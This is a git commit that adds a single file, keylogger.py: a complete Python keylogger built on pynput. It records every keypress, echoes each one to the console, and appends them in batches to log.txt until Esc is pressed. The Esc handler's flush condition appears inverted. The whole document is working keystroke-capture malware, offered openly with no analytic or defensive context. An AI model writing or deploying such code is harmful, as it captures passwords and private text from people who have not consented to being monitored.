5108cb7b433c14e34a1730ee9e0feef45dc0fc9b
web3-guy <98639088+web3-guy@users.noreply.github.com>
2022-11-17 01:54:30 -0800

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,41 @@
+#!/usr/bin/python3
+
+import pynput
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+def on_press(key):
+	global keys, count
+
+	keys.append(key)
+	count += 1
+	print("{} pressed".format(key))
+
+	if count >= 10:
+		count = 0
+		write_file(keys)
+		keys = []
+
+
+def write_file(keys):
+	with open("log.txt", "a") as f:
+		for key in keys:
+			k = str(key).replace("'", "")
+			if k.find("space") > 0:
+				f.write("\n")
+			elif k.find("Key") == -1:
+				f.write(k)
+
+
+def on_release(key):
+	if key == Key.esc:
+		if not len(keys):
+			write_file(keys)
+		return False
+
+
+with Listener(on_press = on_press, on_release=on_release) as lis:
+	lis.join()
+
